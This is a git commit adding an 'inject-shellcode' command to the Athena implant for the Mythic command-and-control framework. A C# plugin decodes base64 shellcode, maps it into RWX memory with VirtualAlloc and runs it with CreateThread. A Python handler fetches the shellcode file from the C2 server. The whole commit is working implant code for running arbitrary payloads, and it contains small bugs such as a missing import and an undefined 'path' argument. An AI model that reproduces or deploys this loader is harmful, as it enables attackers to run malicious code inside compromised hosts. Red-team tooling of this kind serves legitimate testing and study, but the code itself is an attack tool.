9b5270fb3fc0dbdfc587a781020c2df50704bed1
ascemama <antoine.scemama@yahoo.com>
2022-10-03 16:19:55 +0800

    first try

---
+++ Payload_Type/athena/agent_code/AthenaPlugins/inject-shellcode/inject-shellcode.cs
@@ -0,0 +1,107 @@
+﻿using PluginBase;
+using System;
+using System.Runtime.InteropServices;
+using System.Diagnostics;
+using System.Threading;
+using System.Text;
+
+namespace Plugin
+{
+    public class injectshellcode
+    {
+        public static void Execute(Dictionary<string, object> args)
+        {
+            string res = "";
+
+            if (args.ContainsKey("File") && (string)args["File"] != "")
+            {
+                var x64shellcode = Convert.FromBase64String((string)args["shellcode"]);
+                //var psStr = Encoding.UTF8.GetString(base64EncodedBytes);
+                //psStr = psStr.Replace("Write-Host", "Write-Output");
+
+
+
+                /*FileStream filestream = new FileStream("out.txt", FileMode.Create);
+                var streamwriter = new StreamWriter(filestream);
+                streamwriter.AutoFlush = true;
+                Console.SetOut(streamwriter);
+                Console.SetError(streamwriter);
+                */
+                StringBuilder builder = new StringBuilder();
+                TextWriter writer = new StringWriter(builder);
+                Console.SetOut(writer);
+                Console.SetError(writer);
+
+                // byte[] x64shellcode = new byte[2] { 0xfc, 0x48 };
+
+                IntPtr funcAddr = VirtualAlloc(
+                                      IntPtr.Zero,
+                                      (ulong)x64shellcode.Length,
+                                      (uint)StateEnum.MEM_COMMIT,
+                                      (uint)Protection.PAGE_EXECUTE_READWRITE);
+                Marshal.Copy(x64shellcode, 0, (IntPtr)(funcAddr), x64shellcode.Length);
+
+                IntPtr hThread = IntPtr.Zero;
+                uint threadId = 0;
+                IntPtr pinfo = IntPtr.Zero;
+
+                hThread = CreateThread(0, 0, funcAddr, pinfo, 0, ref threadId);
+
+                Thread.Sleep(10000);
+                //WaitForSingleObject(hThread, 0xFFFFFFFF);
+                WaitForSingleObject(hThread, 0);
+                /*filestream.Close();
+                using (StreamReader sr = new StreamReader("out.txt"))
+                {
+                    res = sr.ReadToEnd();
+                }*/
+                res= builder.ToString();
+            }
+            PluginHandler.AddResponse(new ResponseResult
+            {
+                completed = "true",
+                user_output = res,
+                task_id = (string)args["task-id"],
+               // status = "error"
+            });
+        }
+        #region pinvokes
+        [DllImport("kernel32.dll")]
+        private static extern IntPtr VirtualAlloc(
+            IntPtr lpStartAddr,
+            ulong size,
+            uint flAllocationType,
+            uint flProtect);
+
+        [DllImport("kernel32.dll")]
+        private static extern IntPtr CreateThread(
+            uint lpThreadAttributes,
+            uint dwStackSize,
+            IntPtr lpStartAddress,
+            IntPtr param,
+            uint dwCreationFlags,
+            ref uint lpThreadId);
+
+        [DllImport("kernel32.dll")]
+        private static extern uint WaitForSingleObject(
+            IntPtr hHandle,
+            uint dwMilliseconds);
+
+        public enum StateEnum
+        {
+            MEM_COMMIT = 0x1000,
+            MEM_RESERVE = 0x2000,
+            MEM_FREE = 0x10000
+        }
+
+        public enum Protection
+        {
+            PAGE_READONLY = 0x02,
+            PAGE_READWRITE = 0x04,
+            PAGE_EXECUTE = 0x10,
+            PAGE_EXECUTE_READ = 0x20,
+            PAGE_EXECUTE_READWRITE = 0x40,
+        }
+        #endregion
+    }
+}
---
+++ Payload_Type/athena/mythic/agent_functions/inject-shellcode.py
@@ -0,0 +1,62 @@
+from mythic_payloadtype_container.MythicCommandBase import *
+import json
+from mythic_payloadtype_container.MythicRPC import *
+
+
+class PowerShellScriptArguments(TaskArguments):
+    def __init__(self, command_line, **kwargs):
+        super().__init__(command_line)
+        self.args = [
+            CommandParameter(
+                name="File",
+                type=ParameterType.File,
+                description="shellcode file",
+                parameter_group_info=[ParameterGroupInfo(ui_position=1,required=True)],
+            ),
+        ]
+    async def parse_arguments(self):
+        if len(self.command_line.strip()) == 0:
+            raise Exception("inject-shellcode requires at least one command-line parameter.\n\tUsage: {}".format(PowerShellCommand.help_cmd))
+        if self.command_line[0] == "{":
+            self.load_args_from_json_string(self.command_line)
+        else:
+            self.args["path"].value = self.command_line
+         
+
+
+
+class PowerShellScriptCommand(CommandBase):
+    cmd = "inject-shellcode"
+    needs_admin = False
+    help_cmd = ""
+    description = "Inject a shellcode in the agent process"
+    version = 1
+    is_exit = False
+    is_file_browse = False
+    is_process_list = False
+    is_download_file = True
+    is_upload_file = False
+    is_remove_file = False
+    author = "@ascemama"
+    argument_class = PowerShellScriptArguments
+    attackmapping = ["T1059", "T1059.004"]
+    attributes = CommandAttributes(
+        load_only=True,
+    )
+
+    async def create_tasking(self, task: MythicTask) -> MythicTask:
+        if task.args.get_arg("File"):
+            file_resp = await MythicRPC().execute("get_file",file_id=task.args.get_arg("File"),task_id=task.id,get_contents=True)
+            if file_resp.status == MythicRPCStatus.Success:
+                if len(file_resp.response) > 0:
+                    task.args.add_arg("shellcode", file_resp.response[0]["contents"])
+                    task.display_params = f"{file_resp.response[0]['filename']}"
+                else:
+                    raise Exception("Failed to find that file")
+            else:
+                raise Exception("Error from Mythic trying to get file: " + str(file_resp.error))
+
+        return task
+
+    async def process_response(self, response: AgentResponse):
+        pass
